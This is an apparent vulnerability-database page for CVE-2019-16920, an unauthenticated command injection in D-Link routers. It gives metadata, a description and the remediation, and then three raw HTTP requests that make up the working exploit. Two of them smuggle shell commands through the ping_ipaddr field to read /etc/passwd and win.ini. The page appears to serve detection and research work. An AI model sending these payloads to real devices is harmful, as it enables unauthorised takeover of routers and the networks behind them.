---
layout: post
cve_id: CVE-2019-16920
title: D-Link Routers - Remote Code Execution
pcap: true
pcap_path: /pcaps/2019/CVE-2019-16920.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-16920.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: critical
impact: 'Successful exploitation of this vulnerability allows an attacker to execute
  arbitrary code on the affected router, potentially leading to complete compromise
  of the device and the network it is connected to.

  '
remediation: 'Apply the latest firmware update provided by D-Link to mitigate this
  vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2019-16920
- https://github.com/pwnhacker0x18/CVE-2019-16920-MassPwn3r
- https://fortiguard.com/zeroday/FG-VD-19-117
- https://www.seebug.org/vuldb/ssvid-98079
- https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-16920
  cwe-id: CWE-78
  epss-score: 0.94187
  epss-percentile: 0.99914
  cpe: cpe:2.3:o:dlink:dir-655_firmware:*:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: dlink
  product: dir-655_firmware
tags:
- cve2019
- cve
- dlink
- rce
- router
- unauth
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565 contain an unauthenticated remote code execution vulnerability. The issue occurs when the attacker sends an arbitrary input to a "PingTest" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these issues also affected; DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.

## üåê HTTP Request
```nohighlight
POST /apply_sec.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2
Connection: close
Content-Length: 142
Content-Type: application/x-www-form-urlencoded
Referer: http://www.victim.com
Accept-Encoding: gzip
html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id=62384
```

```nohighlight
POST /apply_sec.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: close
Content-Length: 95
Content-Type: application/x-www-form-urlencoded
Cookie: uid=1234123
Referer: http://www.victim.com/login_pic.asp
Accept-Encoding: gzip
html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0acat%20%2Fetc%2Fpasswd
```

```nohighlight
POST /apply_sec.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10
Connection: close
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
Cookie: uid=1234123
Referer: http://www.victim.com/login_pic.asp
Accept-Encoding: gzip
html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0atype%20C%3A%5CWindows%5Cwin.ini
```

